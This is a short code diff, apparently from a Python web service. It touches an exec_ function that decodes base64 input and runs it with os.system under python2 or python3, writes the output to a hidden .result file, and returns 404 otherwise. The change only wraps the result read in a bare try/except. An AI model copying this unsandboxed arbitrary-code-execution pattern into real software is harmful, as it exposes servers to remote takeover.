@@ -12,8 +12,10 @@ def exec_():
 
     if py_v in ['3','2']:
       os.system(f'python{py_v} -c \'exec(__import__("base64").b64decode("{code}".encode()).decode())\' 2> /dev/null > .result')
-
-      with open('.result', 'r') as f:
-        return f.read()
+      try:
+        with open('.result', 'r') as f:
+          return f.read()
+      except:
+        return ''
 
   return abort(404)
